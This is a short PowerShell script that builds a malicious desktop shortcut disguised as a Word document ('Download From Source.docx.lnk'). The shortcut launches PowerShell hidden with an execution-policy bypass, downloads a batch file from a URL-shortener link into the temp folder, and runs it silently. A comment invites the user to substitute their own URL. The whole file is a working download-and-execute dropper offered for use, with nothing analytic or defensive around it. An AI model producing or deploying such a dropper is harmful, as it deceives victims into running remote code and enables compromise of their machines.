$desktopPath = [Environment]::GetFolderPath("Desktop")
$shortcutPath = Join-Path -Path $desktopPath -ChildPath "Download From Source.docx.lnk"
$cmdUrl = "http://tiny.cc/jtom001"  # REPLACE WITH YOUR ACTUAL URL

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$cmdUrl' -OutFile `$env:TEMP\l.cmd; Start-Process -FilePath `$env:TEMP\l.cmd -WindowStyle Hidden`""
$Shortcut.IconLocation = "cmd.exe,0"
$Shortcut.Save()

Write-Host "Shortcut created: $shortcutPath"